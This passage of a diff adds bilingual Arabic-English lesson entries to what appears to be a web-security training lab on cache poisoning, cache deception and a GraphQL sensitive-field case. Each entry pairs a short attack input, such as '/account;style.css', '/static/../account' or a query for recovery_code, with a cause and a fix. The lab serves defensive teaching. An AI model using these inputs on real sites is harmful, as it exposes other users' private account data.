+        "ar": "رمز HTTP الخارجي يصف تجربة التهيئة والقراءة. قارن prime_response وvictim_response وvictim_status ومفاتيح الكاش. بقاء 200 بعد الإصلاح صحيح إذا لم ينتقل المحتوى المخالف بين السياقين. استخرج المضيف من إعداد موثوق أو تحقق منه قبل بناء الروابط.",
+        "en": "Outer HTTP describes the prime/read experiment. Compare prime_response, victim_response, victim_status and both keys. A repaired 200 is correct when content no longer crosses contexts. Use a configured trusted host or validate it before generating links."
+      },
+      "bad_code": "cache[key_without_context] = origin_response",
+      "fixed_code": "if not response.private_or_no_store:\n    cache[representation_key] = origin_response",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "cache-query",
+    "group": "cache",
+    "title": {
+      "ar": "معامل تحويل خارج مفتاح الكاش",
+      "en": "Unkeyed redirect parameter"
+    },
+    "level": "advanced",
+    "normal": {
+      "next": "default"
+    },
+    "attack": {
+      "next": "external"
+    },
+    "cause": {
+      "ar": "next يغيّر وجهة الاستجابة لكن المفتاح يتجاهله.",
+      "en": "next changes the response destination but the key ignores it."
+    },
+    "fix": {
+      "ar": "طابق مفتاح الكاش مع المدخلات التي تغيّر الاستجابة وافرض سياسة الوجهة.",
+      "en": "Include response-varying inputs in the key and enforce destination policy."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "طبقة أصل وذاكرة مشتركة تنفذ طلب تهيئة ثم قراءة مستقلة بسياق مستخدم آخر. كل إرسال يبدأ بكاش بارد كي تكون المقارنة قابلة للتكرار. افحص مفتاح التخزين وما وصل للقارئ الثاني. في هذه الحالة: next يغيّر وجهة الاستجابة لكن المفتاح يتجاهله.",
+        "en": "An origin/cache pipeline performs a prime followed by an independent read in another user context. Each submission starts cold for reproducibility. Inspect cache keys and the second reader’s response. In this case: next changes the response destination but the key ignores it."
+      },
+      "interpretation": {
+        "ar": "رمز HTTP الخارجي يصف تجربة التهيئة والقراءة. قارن prime_response وvictim_response وvictim_status ومفاتيح الكاش. بقاء 200 بعد الإصلاح صحيح إذا لم ينتقل المحتوى المخالف بين السياقين. طابق مفتاح الكاش مع المدخلات التي تغيّر الاستجابة وافرض سياسة الوجهة.",
+        "en": "Outer HTTP describes the prime/read experiment. Compare prime_response, victim_response, victim_status and both keys. A repaired 200 is correct when content no longer crosses contexts. Include response-varying inputs in the key and enforce destination policy."
+      },
+      "bad_code": "cache[key_without_context] = origin_response",
+      "fixed_code": "if not response.private_or_no_store:\n    cache[representation_key] = origin_response",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "cache-header",
+    "group": "cache",
+    "title": {
+      "ar": "رأس قالب يغيّر مورد الصفحة",
+      "en": "Unkeyed theme asset header"
+    },
+    "level": "advanced",
+    "normal": {
+      "theme": "default"
+    },
+    "attack": {
+      "theme": "external"
+    },
+    "cause": {
+      "ar": "رأس مخصص يغيّر عنوان ملف النمط دون فصل نسخة التخزين.",
+      "en": "A custom header changes a stylesheet URL without partitioning the cache."
+    },
+    "fix": {
+      "ar": "لا تسمح لرأس غير موثوق بتغيير موارد مشتركة أو افصل التمثيل الصحيح.",
+      "en": "Prevent untrusted headers from altering shared assets or correctly partition representations."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "طبقة أصل وذاكرة مشتركة تنفذ طلب تهيئة ثم قراءة مستقلة بسياق مستخدم آخر. كل إرسال يبدأ بكاش بارد كي تكون المقارنة قابلة للتكرار. افحص مفتاح التخزين وما وصل للقارئ الثاني. في هذه الحالة: رأس مخصص يغيّر عنوان ملف النمط دون فصل نسخة التخزين.",
+        "en": "An origin/cache pipeline performs a prime followed by an independent read in another user context. Each submission starts cold for reproducibility. Inspect cache keys and the second reader’s response. In this case: A custom header changes a stylesheet URL without partitioning the cache."
+      },
+      "interpretation": {
+        "ar": "رمز HTTP الخارجي يصف تجربة التهيئة والقراءة. قارن prime_response وvictim_response وvictim_status ومفاتيح الكاش. بقاء 200 بعد الإصلاح صحيح إذا لم ينتقل المحتوى المخالف بين السياقين. لا تسمح لرأس غير موثوق بتغيير موارد مشتركة أو افصل التمثيل الصحيح.",
+        "en": "Outer HTTP describes the prime/read experiment. Compare prime_response, victim_response, victim_status and both keys. A repaired 200 is correct when content no longer crosses contexts. Prevent untrusted headers from altering shared assets or correctly partition representations."
+      },
+      "bad_code": "cache[key_without_context] = origin_response",
+      "fixed_code": "if not response.private_or_no_store:\n    cache[representation_key] = origin_response",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "cache-cookie",
+    "group": "cache",
+    "title": {
+      "ar": "تسريب سعر تعاقدي عبر Cookie",
+      "en": "Contract-price leak through an unkeyed cookie"
+    },
+    "level": "advanced",
+    "normal": {
+      "customer_class": "default"
+    },
+    "attack": {
+      "customer_class": "contract"
+    },
+    "cause": {
+      "ar": "ملف تعريف فئة العميل يغيّر سعراً تعاقدياً ولا يدخل في مفتاح التخزين.",
+      "en": "A customer-class cookie selects a private contract price but is absent from the key."
+    },
+    "fix": {
+      "ar": "افصل الاستجابات حسب سياق التفويض أو امنع التخزين المشترك للمحتوى الخاص.",
+      "en": "Partition by authorization context or prevent shared caching of private content."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "طبقة أصل وذاكرة مشتركة تنفذ طلب تهيئة ثم قراءة مستقلة بسياق مستخدم آخر. كل إرسال يبدأ بكاش بارد كي تكون المقارنة قابلة للتكرار. افحص مفتاح التخزين وما وصل للقارئ الثاني. في هذه الحالة: ملف تعريف فئة العميل يغيّر سعراً تعاقدياً ولا يدخل في مفتاح التخزين.",
+        "en": "An origin/cache pipeline performs a prime followed by an independent read in another user context. Each submission starts cold for reproducibility. Inspect cache keys and the second reader’s response. In this case: A customer-class cookie selects a private contract price but is absent from the key."
+      },
+      "interpretation": {
+        "ar": "رمز HTTP الخارجي يصف تجربة التهيئة والقراءة. قارن prime_response وvictim_response وvictim_status ومفاتيح الكاش. بقاء 200 بعد الإصلاح صحيح إذا لم ينتقل المحتوى المخالف بين السياقين. افصل الاستجابات حسب سياق التفويض أو امنع التخزين المشترك للمحتوى الخاص.",
+        "en": "Outer HTTP describes the prime/read experiment. Compare prime_response, victim_response, victim_status and both keys. A repaired 200 is correct when content no longer crosses contexts. Partition by authorization context or prevent shared caching of private content."
+      },
+      "bad_code": "cache[key_without_context] = origin_response",
+      "fixed_code": "if not response.private_or_no_store:\n    cache[representation_key] = origin_response",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "cache-get-body",
+    "group": "cache",
+    "title": {
+      "ar": "جسم GET خارج المفتاح",
+      "en": "GET body omitted from the key"
+    },
+    "level": "advanced",
+    "normal": {
+      "body": "default"
+    },
+    "attack": {
+      "body": "training-banner"
+    },
+    "cause": {
+      "ar": "الأصل يستخدم جسم GET لصناعة محتوى بينما الكاش يعتمد المسار فقط.",
+      "en": "The origin uses a GET body to generate content while the cache keys only by path."
+    },
+    "fix": {
+      "ar": "وحّد عقد الطلب ومفتاح الكاش؛ لا تستخدم جسماً غير محسوب لصناعة استجابة مشتركة.",
+      "en": "Align the request contract and key; do not generate shared responses from unkeyed bodies."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "طبقة أصل وذاكرة مشتركة تنفذ طلب تهيئة ثم قراءة مستقلة بسياق مستخدم آخر. كل إرسال يبدأ بكاش بارد كي تكون المقارنة قابلة للتكرار. افحص مفتاح التخزين وما وصل للقارئ الثاني. في هذه الحالة: الأصل يستخدم جسم GET لصناعة محتوى بينما الكاش يعتمد المسار فقط.",
+        "en": "An origin/cache pipeline performs a prime followed by an independent read in another user context. Each submission starts cold for reproducibility. Inspect cache keys and the second reader’s response. In this case: The origin uses a GET body to generate content while the cache keys only by path."
+      },
+      "interpretation": {
+        "ar": "رمز HTTP الخارجي يصف تجربة التهيئة والقراءة. قارن prime_response وvictim_response وvictim_status ومفاتيح الكاش. بقاء 200 بعد الإصلاح صحيح إذا لم ينتقل المحتوى المخالف بين السياقين. وحّد عقد الطلب ومفتاح الكاش؛ لا تستخدم جسماً غير محسوب لصناعة استجابة مشتركة.",
+        "en": "Outer HTTP describes the prime/read experiment. Compare prime_response, victim_response, victim_status and both keys. A repaired 200 is correct when content no longer crosses contexts. Align the request contract and key; do not generate shared responses from unkeyed bodies."
+      },
+      "bad_code": "cache[key_without_context] = origin_response",
+      "fixed_code": "if not response.private_or_no_store:\n    cache[representation_key] = origin_response",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "cache-private",
+    "group": "cache",
+    "title": {
+      "ar": "تخزين صفحة حساب بين جلسات",
+      "en": "Authenticated page shared across sessions"
+    },
+    "level": "advanced",
+    "normal": {
+      "path": "/public/site.css"
+    },
+    "attack": {
+      "path": "/account"
+    },
+    "cause": {
+      "ar": "استجابة Alice الخاصة تدخل كاشاً مشتركاً ويقرأها مستخدم بلا جلسة.",
+      "en": "Alice’s authenticated response enters a shared cache and is read without a session."
+    },
+    "fix": {
+      "ar": "احترم private وno-store ولا تشارك استجابات الحسابات.",
+      "en": "Honor private/no-store and do not share authenticated account responses."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "طبقة أصل وذاكرة مشتركة تنفذ طلب تهيئة ثم قراءة مستقلة بسياق مستخدم آخر. كل إرسال يبدأ بكاش بارد كي تكون المقارنة قابلة للتكرار. افحص مفتاح التخزين وما وصل للقارئ الثاني. في هذه الحالة: استجابة Alice الخاصة تدخل كاشاً مشتركاً ويقرأها مستخدم بلا جلسة.",
+        "en": "An origin/cache pipeline performs a prime followed by an independent read in another user context. Each submission starts cold for reproducibility. Inspect cache keys and the second reader’s response. In this case: Alice’s authenticated response enters a shared cache and is read without a session."
+      },
+      "interpretation": {
+        "ar": "رمز HTTP الخارجي يصف تجربة التهيئة والقراءة. قارن prime_response وvictim_response وvictim_status ومفاتيح الكاش. بقاء 200 بعد الإصلاح صحيح إذا لم ينتقل المحتوى المخالف بين السياقين. احترم private وno-store ولا تشارك استجابات الحسابات.",
+        "en": "Outer HTTP describes the prime/read experiment. Compare prime_response, victim_response, victim_status and both keys. A repaired 200 is correct when content no longer crosses contexts. Honor private/no-store and do not share authenticated account responses."
+      },
+      "bad_code": "cache[key_without_context] = origin_response",
+      "fixed_code": "if not response.private_or_no_store:\n    cache[representation_key] = origin_response",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "cache-extension",
+    "group": "cache",
+    "title": {
+      "ar": "خداع الكاش بلاحقة ثابتة",
+      "en": "Static-extension cache deception"
+    },
+    "level": "advanced",
+    "normal": {
+      "path": "/public/site.css"
+    },
+    "attack": {
+      "path": "/account/profile.css"
+    },
+    "cause": {
+      "ar": "الأصل يرى صفحة حساب بينما الكاش يعامل لاحقة css كملف عام.",
+      "en": "The origin serves an account page while the cache treats a css suffix as public."
+    },
+    "fix": {
+      "ar": "استند لنوع المورد وسياسة الأصل لا للاحقة المسار فقط.",
+      "en": "Use resource semantics and origin policy rather than path suffix alone."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "طبقة أصل وذاكرة مشتركة تنفذ طلب تهيئة ثم قراءة مستقلة بسياق مستخدم آخر. كل إرسال يبدأ بكاش بارد كي تكون المقارنة قابلة للتكرار. افحص مفتاح التخزين وما وصل للقارئ الثاني. في هذه الحالة: الأصل يرى صفحة حساب بينما الكاش يعامل لاحقة css كملف عام.",
+        "en": "An origin/cache pipeline performs a prime followed by an independent read in another user context. Each submission starts cold for reproducibility. Inspect cache keys and the second reader’s response. In this case: The origin serves an account page while the cache treats a css suffix as public."
+      },
+      "interpretation": {
+        "ar": "رمز HTTP الخارجي يصف تجربة التهيئة والقراءة. قارن prime_response وvictim_response وvictim_status ومفاتيح الكاش. بقاء 200 بعد الإصلاح صحيح إذا لم ينتقل المحتوى المخالف بين السياقين. استند لنوع المورد وسياسة الأصل لا للاحقة المسار فقط.",
+        "en": "Outer HTTP describes the prime/read experiment. Compare prime_response, victim_response, victim_status and both keys. A repaired 200 is correct when content no longer crosses contexts. Use resource semantics and origin policy rather than path suffix alone."
+      },
+      "bad_code": "cache[key_without_context] = origin_response",
+      "fixed_code": "if not response.private_or_no_store:\n    cache[representation_key] = origin_response",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "cache-delimiter",
+    "group": "cache",
+    "title": {
+      "ar": "اختلاف تفسير فاصل المسار",
+      "en": "Path-delimiter cache deception"
+    },
+    "level": "advanced",
+    "normal": {
+      "path": "/public/site.css"
+    },
+    "attack": {
+      "path": "/account;style.css"
+    },
+    "cause": {
+      "ar": "الأصل يزيل الجزء بعد الفاصلة المنقوطة بينما الكاش يصنف النص الكامل كملف ثابت.",
+      "en": "The origin strips a semicolon suffix while the cache classifies the full path as static."
+    },
+    "fix": {
+      "ar": "وحّد تفسير المسار واحترم خصوصية الاستجابة بعد التوجيه.",
+      "en": "Align path interpretation and honor response privacy after routing."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "طبقة أصل وذاكرة مشتركة تنفذ طلب تهيئة ثم قراءة مستقلة بسياق مستخدم آخر. كل إرسال يبدأ بكاش بارد كي تكون المقارنة قابلة للتكرار. افحص مفتاح التخزين وما وصل للقارئ الثاني. في هذه الحالة: الأصل يزيل الجزء بعد الفاصلة المنقوطة بينما الكاش يصنف النص الكامل كملف ثابت.",
+        "en": "An origin/cache pipeline performs a prime followed by an independent read in another user context. Each submission starts cold for reproducibility. Inspect cache keys and the second reader’s response. In this case: The origin strips a semicolon suffix while the cache classifies the full path as static."
+      },
+      "interpretation": {
+        "ar": "رمز HTTP الخارجي يصف تجربة التهيئة والقراءة. قارن prime_response وvictim_response وvictim_status ومفاتيح الكاش. بقاء 200 بعد الإصلاح صحيح إذا لم ينتقل المحتوى المخالف بين السياقين. وحّد تفسير المسار واحترم خصوصية الاستجابة بعد التوجيه.",
+        "en": "Outer HTTP describes the prime/read experiment. Compare prime_response, victim_response, victim_status and both keys. A repaired 200 is correct when content no longer crosses contexts. Align path interpretation and honor response privacy after routing."
+      },
+      "bad_code": "cache[key_without_context] = origin_response",
+      "fixed_code": "if not response.private_or_no_store:\n    cache[representation_key] = origin_response",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "cache-normalization",
+    "group": "cache",
+    "title": {
+      "ar": "تطبيع المسار إلى مورد خاص",
+      "en": "Normalization-based cache deception"
+    },
+    "level": "advanced",
+    "normal": {
+      "path": "/public/site.css"
+    },
+    "attack": {
+      "path": "/static/../account"
+    },
+    "cause": {
+      "ar": "المسار يبدأ بمجلد static لكنه يعود إلى account بعد التطبيع.",
+      "en": "The path begins under static but resolves to account after normalization."
+    },
+    "fix": {
+      "ar": "صنّف المورد بعد التطبيع ولا تخزن استجابته الخاصة.",
+      "en": "Classify the normalized resource and do not cache private responses."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "طبقة أصل وذاكرة مشتركة تنفذ طلب تهيئة ثم قراءة مستقلة بسياق مستخدم آخر. كل إرسال يبدأ بكاش بارد كي تكون المقارنة قابلة للتكرار. افحص مفتاح التخزين وما وصل للقارئ الثاني. في هذه الحالة: المسار يبدأ بمجلد static لكنه يعود إلى account بعد التطبيع.",
+        "en": "An origin/cache pipeline performs a prime followed by an independent read in another user context. Each submission starts cold for reproducibility. Inspect cache keys and the second reader’s response. In this case: The path begins under static but resolves to account after normalization."
+      },
+      "interpretation": {
+        "ar": "رمز HTTP الخارجي يصف تجربة التهيئة والقراءة. قارن prime_response وvictim_response وvictim_status ومفاتيح الكاش. بقاء 200 بعد الإصلاح صحيح إذا لم ينتقل المحتوى المخالف بين السياقين. صنّف المورد بعد التطبيع ولا تخزن استجابته الخاصة.",
+        "en": "Outer HTTP describes the prime/read experiment. Compare prime_response, victim_response, victim_status and both keys. A repaired 200 is correct when content no longer crosses contexts. Classify the normalized resource and do not cache private responses."
+      },
+      "bad_code": "cache[key_without_context] = origin_response",
+      "fixed_code": "if not response.private_or_no_store:\n    cache[representation_key] = origin_response",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "cache-control",
+    "group": "cache",
+    "title": {
+      "ar": "تجاهل no-store من الأصل",
+      "en": "Ignoring origin no-store"
+    },
+    "level": "advanced",
+    "normal": {
+      "path": "/public/site.css"
+    },
+    "attack": {
+      "path": "/account/summary.css"
+    },
+    "cause": {
+      "ar": "إعداد التخزين يفرض الحفظ رغم أن الأصل يمنع تخزين صفحة حساسة.",
+      "en": "A cache override stores a sensitive page despite the origin’s no-store directive."
+    },
+    "fix": {
+      "ar": "لا تتجاوز منع التخزين للصفحات الحساسة بمبدأ cache everything.",
+      "en": "Do not override no-store for sensitive routes with cache-everything rules."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "طبقة أصل وذاكرة مشتركة تنفذ طلب تهيئة ثم قراءة مستقلة بسياق مستخدم آخر. كل إرسال يبدأ بكاش بارد كي تكون المقارنة قابلة للتكرار. افحص مفتاح التخزين وما وصل للقارئ الثاني. في هذه الحالة: إعداد التخزين يفرض الحفظ رغم أن الأصل يمنع تخزين صفحة حساسة.",
+        "en": "An origin/cache pipeline performs a prime followed by an independent read in another user context. Each submission starts cold for reproducibility. Inspect cache keys and the second reader’s response. In this case: A cache override stores a sensitive page despite the origin’s no-store directive."
+      },
+      "interpretation": {
+        "ar": "رمز HTTP الخارجي يصف تجربة التهيئة والقراءة. قارن prime_response وvictim_response وvictim_status ومفاتيح الكاش. بقاء 200 بعد الإصلاح صحيح إذا لم ينتقل المحتوى المخالف بين السياقين. لا تتجاوز منع التخزين للصفحات الحساسة بمبدأ cache everything.",
+        "en": "Outer HTTP describes the prime/read experiment. Compare prime_response, victim_response, victim_status and both keys. A repaired 200 is correct when content no longer crosses contexts. Do not override no-store for sensitive routes with cache-everything rules."
+      },
+      "bad_code": "cache[key_without_context] = origin_response",
+      "fixed_code": "if not response.private_or_no_store:\n    cache[representation_key] = origin_response",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "graphql-field",
+    "group": "graphql",
+    "title": {
+      "ar": "حقل حساس داخل كائن مسموح",
+      "en": "Sensitive nested field"
+    },
+    "level": "advanced",
+    "normal": {
+      "query": "{ me { id email } }"
+    },
+    "attack": {
+      "query": "{ me { id recovery_code } }"
+    },
+    "cause": {
+      "ar": "صلاحية قراءة me لا تعني السماح بكل حقل فيه.",
+      "en": "Permission to read me does not authorize every nested field."
+    },
+    "fix": {
+      "ar": "افرض صلاحية الحقل الحساس داخل الـresolver.",
+      "en": "Enforce sensitive-field authorization in its resolver."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة مستندات بمفسّر GraphQL تعليمي محدود يدعم العمليات والحقول وAliases والمعاملات العددية والنصية. الجلسة Alice؛ بيانات Bob والمؤسسة south خاصة. لا يدعم المحرك Variables أو Fragments. في هذه الحالة: صلاحية قراءة me لا تعني السماح بكل حقل فيه.",
+        "en": "A document service uses a bounded GraphQL parser supporting operations, fields, aliases and scalar arguments. Alice is the fixed actor; Bob and south-tenant data are private. Variables and fragments are not supported. In this case: Permission to read me does not authorize every nested field."
+      },
+      "interpretation": {
+        "ar": "اقرأ result وerrors وexecuted_fields، ثم before وafter عند التعديل. GraphQL قد يعيد 200 مع خطأ لحقل محدد؛ غياب البيانات الخاصة أو حجب الكلفة الزائدة هو الفرق المطلوب. افرض صلاحية الحقل الحساس داخل الـresolver.",
+        "en": "Inspect result, errors and executed_fields, then before/after for mutations. GraphQL may return 200 with field errors; withheld private data or rejected excess work establishes the repair. Enforce sensitive-field authorization in its resolver."
+      },
+      "bad_code": "return resolve_without_authorization_or_budget(ast)",
+      "fixed_code": "validate_operation_budget(ast)\nresolve_each_field_with_authorization(ast)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
